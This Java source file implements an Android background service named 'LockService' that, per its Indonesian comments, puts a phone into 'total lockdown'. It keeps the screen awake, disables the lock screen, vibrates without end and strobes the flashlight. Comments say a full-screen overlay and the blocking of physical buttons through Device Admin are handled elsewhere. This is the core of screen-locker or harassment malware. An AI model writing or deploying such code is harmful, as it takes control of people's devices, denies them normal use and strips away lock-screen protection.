package com.lockdown.total;

import android.app.KeyguardManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.Vibrator;
import android.view.WindowManager;

public class LockService extends Service {
    private PowerManager.WakeLock wakeLock;
    private KeyguardManager.KeyguardLock keyguardLock;
    private Vibrator vibrator;
    private CameraManager cameraManager;
    private String cameraId;
    private Handler handler = new Handler();
    private boolean flashOn = false;

    @Override
    public void onCreate() {
        super.onCreate();
        
        // --- LOCK TOTAL ---
        // 1. Wake lock (layar tetap menyala)
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "LockDown");
        wakeLock.acquire(10*60*1000L);

        // 2. Kunci layar & matikan keyguard
        KeyguardManager km = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
        keyguardLock = km.newKeyguardLock("LockDown");
        keyguardLock.disableKeyguard();

        // 3. Getaran terus-menerus
        vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        startVibration();

        // 4. Senter kedip
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            cameraId = cameraManager.getCameraIdList()[0];
        } catch (CameraAccessException e) {}
        startFlash();

        // 5. Overlay penuh di atas semua
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        // (dilakukan di MainActivity untuk overlay)
        
        // 6. Matikan tombol fisik (via Device Admin)
        // (dilakukan di MainActivity)
    }

    private void startVibration() {
        handler.post(new Runnable() {
            @Override
            public void run() {
                if (vibrator != null && vibrator.hasVibrator()) {
                    long[] pattern = {0, 200, 100, 200, 100, 500};
                    vibrator.vibrate(pattern, 0); // loop forever
                }
                handler.postDelayed(this, 1000);
            }
        });
    }

    private void startFlash() {
        handler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    if (cameraManager != null && cameraId != null) {
                        flashOn = !flashOn;
                        cameraManager.setTorchMode(cameraId, flashOn);
                    }
                } catch (CameraAccessException e) {}
                handler.postDelayed(this, 300);
            }
        });
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (keyguardLock != null) keyguardLock.reenableKeyguard();
        if (vibrator != null) vibrator.cancel();
        handler.removeCallbacksAndMessages(null);
        try {
            if (cameraManager != null && cameraId != null) {
                cameraManager.setTorchMode(cameraId, false);
            }
        } catch (CameraAccessException e) {}
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
                    }
